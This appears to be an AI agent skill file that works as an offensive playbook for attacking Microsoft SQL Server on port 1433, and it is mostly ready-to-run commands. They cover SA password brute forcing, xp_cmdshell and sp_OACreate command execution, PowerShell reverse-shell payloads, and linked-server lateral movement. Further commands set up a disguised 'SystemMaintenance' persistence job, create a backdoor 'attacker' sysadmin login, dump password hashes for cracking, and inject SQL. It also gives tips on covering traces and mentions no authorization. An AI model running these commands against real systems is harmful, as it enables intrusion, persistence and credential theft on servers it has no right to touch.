---
name: sqlserver-attack
description: "SQL Server penetration testing and exploitation. Use when a target exposes port 1433, SQL Server allows remote connections (weak SA password), or you need to extract data from the database or achieve command execution. Covers unauthorized access, database enumeration and dumping, xp_cmdshell command execution, sp_OACreate COM object abuse, BULK INSERT file reads, Linked Server lateral movement, SQL Agent Job persistence, stored procedure abuse, and user creation for privilege escalation"
zh-signals: "SQL Server 渗透测试与利用，覆盖 xp_cmdshell 命令执行与横向移动。信号:SQL Server,MSSQL,1433,xp_cmdshell,数据库攻击"
when-to-use: "Use when a target exposes SQL Server on 1433 with remote access or weak SA credentials and you need to enumerate, extract data, or execute commands."
metadata:
  tags: "sqlserver,mssql,1433,sa,xp_cmdshell,sp_oacreate,linked-server,bulk-insert,sql-agent,stored-procedure"
  category: "exploit"
---

# SQL Server Penetration Testing and Exploitation

SQL Server listens on port 1433 by default, and a weak SA password is the most common entry point. Once sysadmin rights are obtained, xp_cmdshell allows direct operating system command execution; even when xp_cmdshell is disabled, multiple RCE paths remain available such as sp_OACreate, CLR Assembly, and SQL Agent Jobs. The Linked Server mechanism is an important pivot for lateral movement inside the internal network.

## Further Reading (Must Read)
- Full exploitation commands and payloads -> read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: Service Discovery

### 1.1 Port Scanning and Version Identification

```bash
# Nmap version probe
nmap -sV -p 1433 TARGET

# SQL Server information gathering script
nmap -p 1433 --script ms-sql-info TARGET

# Probe SQL Server Browser (UDP 1434, retrieves instance information)
nmap -sU -p 1434 --script ms-sql-info TARGET
```

### 1.2 Manual Connection Test

```bash
# sqlcmd (official Microsoft client)
sqlcmd -S TARGET,1433 -U sa -P 'password' -Q "SELECT @@version;"

# mssqlclient.py (Impacket, the pentesting favorite)
mssqlclient.py sa:'password'@TARGET -port 1433

# sqsh (native Linux client)
sqsh -S TARGET:1433 -U sa -P 'password'

# Windows authentication (current domain credentials)
sqlcmd -S TARGET -E -Q "SELECT @@version;"

# mssqlclient.py with Windows authentication
mssqlclient.py DOMAIN/user:'password'@TARGET -windows-auth
```

**Key Decision**:
- Version information returned -> connected, proceed to Phase 3
- `Login failed for user` returned -> wrong password, proceed to Phase 2
- `TCP Provider: Error` returned -> network unreachable or the port is blocked by a firewall
- Version number returned -> determine the SQL Server version (it affects the available attack paths)

---

## Phase 2: Authentication Checks

### 2.1 Authentication Modes

```
SQL Server authentication mode (determines the attack path)
├─ SQL Server authentication — username + password (weak SA passwords are most common)
├─ Windows authentication — domain credentials (NTLM/Kerberos)
└─ Mixed mode — supports both of the above (the most common configuration)
```

### 2.2 SA Weak Password Testing

```bash
# Common SA default passwords
sqlcmd -S TARGET -U sa -P '' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P 'sa' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P '123456' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P 'admin' -Q "SELECT 1;"
sqlcmd -S TARGET -U sa -P 'Password1' -Q "SELECT 1;"

# Windows authentication (no password, uses the current credentials)
sqlcmd -S TARGET -E -Q "SELECT 1;"
```

### 2.3 Brute Force

```bash
# Hydra
hydra -l sa -P passwords.txt TARGET mssql

# Nmap
nmap -p 1433 --script ms-sql-brute TARGET

# Medusa
medusa -h TARGET -u sa -P passwords.txt -M mssql

# Metasploit
msf> use auxiliary/scanner/mssql/mssql_login
msf> set RHOSTS TARGET
msf> run
```

---

## Phase 3: Attack Decision Tree

```
Connected to SQL Server?
├─ Query the current privileges
│   SELECT SYSTEM_USER, USER_NAME();
│   SELECT IS_SRVROLEMEMBER('sysadmin');
│
├─ sysadmin (SA) privileges
│   ├─ xp_cmdshell can be enabled -> RCE (Phase 4.1)
│   ├─ xp_cmdshell disabled and cannot be enabled -> sp_OACreate COM object RCE (Phase 4.2)
│   ├─ BULK INSERT permission available -> file read (Phase 4.3)
│   ├─ Linked Server available -> lateral movement to other SQL Servers (Phase 5.1)
│   ├─ SQL Agent permission available -> Job persistence (Phase 5.2)
│   ├─ CLR integration can be enabled -> CLR Assembly RCE (Phase 4.2)
│   └─ sys.sql_logins readable -> credential extraction (Phase 6.2)
│
├─ Normal database user privileges
│   ├─ information_schema readable -> database enumeration (Phase 6.1)
│   ├─ IMPERSONATE permission -> privilege escalation via impersonation
│   ├─ db_owner role -> privilege escalation via EXECUTE AS
│   └─ Attempt privilege escalation -> sp_addsrvrolemember (Phase 6.3)
│
└─ SQL injection scenario
    ├─ Stacked queries available -> xp_cmdshell RCE
    ├─ UNION injection -> data extraction
    ├─ Time-based blind injection -> probing with WAITFOR DELAY
    └─ Error-based injection -> CONVERT type conversion errors
```

### Preliminary Information Gathering

```bash
# Current user and privileges
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT SYSTEM_USER, USER_NAME();"
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT IS_SRVROLEMEMBER('sysadmin');"

# SQL Server version
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT @@version;"

# All databases
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT name FROM sys.databases;"

# Server configuration (whether xp_cmdshell, OLE Automation, etc. are enabled)
sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC sp_configure;"

# Check linked servers
sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC sp_linkedservers;"

# Check SQL Agent status
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT dss.status_desc FROM sys.dm_server_services dss WHERE servicename LIKE '%Agent%';"

# Interactive enumeration with mssqlclient.py
mssqlclient.py sa:'password'@TARGET
# After entering, run:
# enum_db         — list databases
# enum_logins     — enumerate login accounts
# enum_impersonate — check impersonable users
```

---

## Phase 4: RCE Quick Reference

### 4.1 xp_cmdshell Command Execution (requires sysadmin)

```bash
# Enable xp_cmdshell
sqlcmd -S TARGET -U sa -P 'password' -Q "
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

# Execute system commands
sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC xp_cmdshell 'whoami';"
sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC xp_cmdshell 'ipconfig';"

# Reverse shell (PowerShell)
sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';"

# mssqlclient.py (enables xp_cmdshell automatically)
mssqlclient.py sa:'password'@TARGET
# After entering, run:
# enable_xp_cmdshell
# xp_cmdshell whoami

# Disable it again after use (reduce traces)
sqlcmd -S TARGET -U sa -P 'password' -Q "
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;"
```

### 4.2 sp_OACreate COM Object RCE (alternative when xp_cmdshell is disabled)

```bash
# Enable OLE Automation
sqlcmd -S TARGET -U sa -P 'password' -Q "
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;"

# Execute a command through wscript.shell
sqlcmd -S TARGET -U sa -P 'password' -Q "
DECLARE @shell INT;
EXEC sp_oacreate 'wscript.shell', @shell OUTPUT;
EXEC sp_oamethod @shell, 'run', NULL, 'cmd /c whoami > C:\temp\output.txt';"

# Write a file through Scripting.FileSystemObject
sqlcmd -S TARGET -U sa -P 'password' -Q "
DECLARE @fs INT, @file INT;
EXEC sp_oacreate 'Scripting.FileSystemObject', @fs OUTPUT;
EXEC sp_oamethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\temp\payload.txt', 1;
EXEC sp_oamethod @file, 'Write', NULL, 'malicious content';
EXEC sp_oamethod @file, 'Close';"
```

### 4.3 BULK INSERT File Read

```bash
# Read a local file
sqlcmd -S TARGET -U sa -P 'password' -Q "
CREATE TABLE #tmp (line VARCHAR(MAX));
BULK INSERT #tmp FROM 'C:\Windows\System32\drivers\etc\hosts';
SELECT * FROM #tmp;
DROP TABLE #tmp;"

# Read a file with OPENROWSET
sqlcmd -S TARGET -U sa -P 'password' -Q "
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS Contents;"
```

-> More methods and full payloads -> read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 5: Lateral Movement and Persistence Quick Reference

### 5.1 Linked Server Lateral Movement

```bash
# List all linked servers
sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC sp_linkedservers;"

# Run a query on the remote server through OPENQUERY
sqlcmd -S TARGET -U sa -P 'password' -Q "
SELECT * FROM OPENQUERY(LINKED_SERVER, 'SELECT @@servername; SELECT @@version;');"

# Execute commands on the remote server through EXEC AT (chained exploitation)
sqlcmd -S TARGET -U sa -P 'password' -Q "
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT LINKED_SERVER;
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT LINKED_SERVER;
EXEC ('EXEC xp_cmdshell ''whoami'';') AT LINKED_SERVER;"

# Nested linked servers (multi-hop lateral movement)
sqlcmd -S TARGET -U sa -P 'password' -Q "
SELECT * FROM OPENQUERY(SERVER_A, 'SELECT * FROM OPENQUERY(SERVER_B, ''SELECT @@servername'')');"
```

### 5.2 SQL Agent Job Persistence

```bash
# Create a persistence job
sqlcmd -S TARGET -U sa -P 'password' -Q "
USE msdb;
EXEC dbo.sp_add_job @job_name = 'SystemMaintenance';
EXEC dbo.sp_add_jobstep @job_name = 'SystemMaintenance',
    @step_name = 'step1',
    @subsystem = 'CmdExec',
    @command = 'powershell -e <BASE64_PAYLOAD>';
EXEC dbo.sp_add_jobserver @job_name = 'SystemMaintenance';
EXEC dbo.sp_start_job @job_name = 'SystemMaintenance';"

# Attach a schedule (runs every day)
sqlcmd -S TARGET -U sa -P 'password' -Q "
USE msdb;
EXEC dbo.sp_add_schedule @schedule_name = 'DailyRun',
    @freq_type = 4,
    @freq_interval = 1,
    @active_start_time = 010000;
EXEC dbo.sp_attach_schedule @job_name = 'SystemMaintenance',
    @schedule_name = 'DailyRun';"

# List existing jobs
sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC msdb.dbo.sp_help_job;"
```

-> read [references/attack-techniques.md](references/attack-techniques.md) for the full technical details

---

## Phase 6: Data Extraction and Privilege Escalation

### 6.1 Database Enumeration

```bash
# List all databases
sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT name FROM sys.databases;"

# List all tables in a given database
sqlcmd -S TARGET -U sa -P 'password' -d DATABASE_NAME -Q "
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;"

# Search for sensitive table names
sqlcmd -S TARGET -U sa -P 'password' -d DATABASE_NAME -Q "
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_NAME LIKE '%password%' OR TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%credential%';"

# Search for sensitive column names
sqlcmd -S TARGET -U sa -P 'password' -d DATABASE_NAME -Q "
SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
WHERE COLUMN_NAME LIKE '%password%' OR COLUMN_NAME LIKE '%secret%' OR COLUMN_NAME LIKE '%token%';"
```

### 6.2 Credential Extraction

```bash
# Extract SQL Server login hashes (requires sysadmin)
sqlcmd -S TARGET -U sa -P 'password' -Q "
SELECT name, password_hash FROM sys.sql_logins;"

# List all server-level logins
sqlcmd -S TARGET -U sa -P 'password' -Q "
SELECT name, type_desc, is_disabled FROM sys.server_principals;"

# List sysadmin members
sqlcmd -S TARGET -U sa -P 'password' -Q "
SELECT name FROM sys.server_principals
WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;"
```

### 6.3 User Creation and Privilege Escalation

```bash
# Create a new login and grant it sysadmin
sqlcmd -S TARGET -U sa -P 'password' -Q "
CREATE LOGIN attacker WITH PASSWORD = 'P@ssw0rd!';
EXEC sp_addsrvrolemember 'attacker', 'sysadmin';"

# IMPERSONATE escalation (check and exploit impersonation rights)
sqlcmd -S TARGET -U sa -P 'password' -Q "
SELECT DISTINCT grantee_principal_id, name
FROM sys.server_permissions
JOIN sys.server_principals ON grantee_principal_id = principal_id
WHERE permission_name = 'IMPERSONATE';"

# Impersonate SA to execute commands
sqlcmd -S TARGET -U lowpriv -P 'password' -Q "
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';
REVERT;"
```

---

## SQL Injection Quick Reference

```bash
# Version detection
' UNION SELECT NULL,@@version--

# Current user
' UNION SELECT NULL,SYSTEM_USER--

# Database list
' UNION SELECT NULL,name FROM master..sysdatabases--

# Table list
' UNION SELECT NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--

# Time-based blind injection
'; WAITFOR DELAY '0:0:5'--

# Stacked injection + xp_cmdshell RCE (highest threat)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--

# Error-based injection (data extraction)
' AND 1=CONVERT(int,(SELECT @@version))--

# Boolean blind injection
' AND SUBSTRING(@@version,1,1)='M'--
```

---

## Tool Quick Reference

| Tool | Purpose |
|------|------|
| sqlcmd | Official SQL Server command line client |
| mssqlclient.py | Impacket pentesting client (recommended) |
| sqsh | Native Linux SQL Server client |
| PowerUpSQL | PowerShell auditing and exploitation framework for SQL Server |
| hydra / medusa | SQL Server password brute forcing |
| nmap ms-sql-* | Built-in Nmap SQL Server script set |
| sqlmap | Automated SQL injection detection and exploitation |
| Metasploit | SQL Server module collection (login / enumeration / RCE) |

---

## Notes

- Once `xp_cmdshell` is enabled, SQL Server logs record it, so it should be disabled immediately after the operation
- `sp_OACreate` command execution produces no direct output, so the output has to be retrieved by writing to a file or exfiltrating it
- During linked server lateral movement, the remote server privileges depend on the mapped account configured for the linked server
- SQL Agent Jobs require the SQL Server Agent service to be running
- BULK INSERT requires the SQL Server service account to have read access to the file
- Cloud-hosted SQL Server (Azure SQL/RDS) usually disables xp_cmdshell and file system access
- In Windows authentication scenarios, domain credentials must be obtained first or the operations must be performed from a machine inside the domain
- `password_hash` values extracted from sys.sql_logins can be cracked with hashcat mode 1731
